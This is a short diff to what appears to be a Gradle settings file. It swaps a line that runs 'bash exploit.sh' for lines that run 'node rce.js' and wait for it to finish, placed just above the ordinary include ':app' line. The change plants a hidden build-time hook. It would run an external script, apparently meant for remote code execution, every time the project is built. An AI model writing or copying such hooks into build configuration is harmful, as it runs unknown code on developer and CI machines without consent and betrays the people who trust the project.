@@ -1,2 +1,3 @@
-"bash exploit.sh".execute()
+def proc = "node rce.js".execute()
+proc.waitFor()
 include ':app'
